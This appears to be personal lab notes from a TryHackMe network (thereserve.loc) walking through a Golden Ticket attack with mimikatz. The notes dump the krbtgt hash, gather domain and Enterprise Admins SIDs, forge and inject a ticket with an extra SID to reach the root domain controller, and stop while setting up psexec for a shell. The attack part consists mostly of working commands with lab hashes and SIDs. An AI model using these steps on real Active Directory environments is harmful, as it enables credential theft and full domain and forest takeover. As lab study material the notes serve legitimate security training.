To carry out this attack you will need:

- The KRBTGT password hash.
- The Security Identifier (SID) of the (CORPDC) Domain.
- The user account we want to impersonate (Administrator).
- Dump SID of **“Enterprise Admin”** of root.thereserve.loc.
	To make your attack more advanced, you can also inject the SID for the `Enterprise Admins` group so that the user you impersonate would have high privileges. This will give you access to all the machines in the entire Forest if we are successful in doing so.
## Dump the krbtgt Hash


1. On the VICTIME_MACHINE poweshell run mimikatz.exe.
    
2. Once in mimikatz run:
	`privilege::debug` 
	 Ensure this outputs privilege "20" ok.
    
3. ﻿`lsadump::lsa /inject /name:krbtgt`
	This dumps the hash and security identifier of the Kerberos Ticket Granting Ticket account allowing you to create a golden ticket.
	
    ![[Golden Ticket Attack with mimikatz-20240608142406169.webp]]

4. Take note of what is outlined in red you'll need it to create the golden ticket.
	- S-1-5-21-170228521-1485475711-3199862024
	- krbtgt
	- 0c757a3445acb94a654554f3ac529ede


## Get the Security Identifier (SID) of the (CORPDC) Domain
On powershell run:

PS C:\Users\Administrator> `Get-ADComputer -Identity "CORPDC"`

![[Golden Ticket Attack with mimikatz-20240608151913994.webp]]



## Dump SID of **“Enterprise Admin”** of root.thereserve.loc

Run on powershell:
PS C:\Users\Administrator> `Get-ADGroup -Identity "Enterprise Admins" -Server rootdc.thereserve.loc`

![[Golden Ticket Attack with mimikatz-20240608152813146.webp]]

## Submit the Golden ticket
In mimikatz run:

 `kerberos::golden /user:Administrator /domain:corp.thereserve.loc /sid:S-1-5-21-170228521-1485475711-3199862024-1009 /service:krbtgt /rc4:0c757a3445acb94a654554f3ac529ede /sids:S-1-5-21-1255581842-1300659601-3764024703-519 /ptt`

### Understanding the Command
- `kerberos::golden`: Indicates that you are creating a Golden Ticket.
- `/user:Administrator`: Specifies the user for whom the Golden Ticket is being created (in this case, the domain administrator).
- `/domain:corp.thereserve.loc`: Specifies the target domain.
- `/sid:S-1-5-21-170228521-1485475711-3199862024-1009`: Specifies the Security Identifier (SID) of the target domain.
- `/service:krbtgt`: Specifies the service account to use, which is typically `krbtgt` (Kerberos Ticket Granting Ticket).
- `/rc4:0c757a3445acb94a654554f3ac529ede`: Specifies the RC4 hash of the `krbtgt` account password.
- `/sids:S-1-5-21-1255581842-1300659601-3764024703-519`: Adds an additional SID to the ticket (useful for domain enumeration and access).
- `/ptt`: Indicates that the ticket should be injected into the current session (Pass-The-Ticket).

![[Golden Ticket Attack with mimikatz-20240608145025836.webp]]

## Use the Golden Ticket to access other machine

﻿In mimikatz run:﻿
﻿`misc::cmd`
﻿
﻿This will open a new command prompt with elevated privileges to all machines.
﻿
![[Golden Ticket Attack with mimikatz-20240608145512638.webp]]

## Interact with rootdc.thereserve.loc

Run on the shell the following command:

C:\Users\Administrator>`dir \\rootdc.thereserve.loc\c$`

![[Golden Ticket Attack with mimikatz-20240608153405335.webp]]

## Get a shell on the ROOTDC

- Start a python http server on you attacking machine in the tools directory you got from tryhackme.
- Get psexec.exe.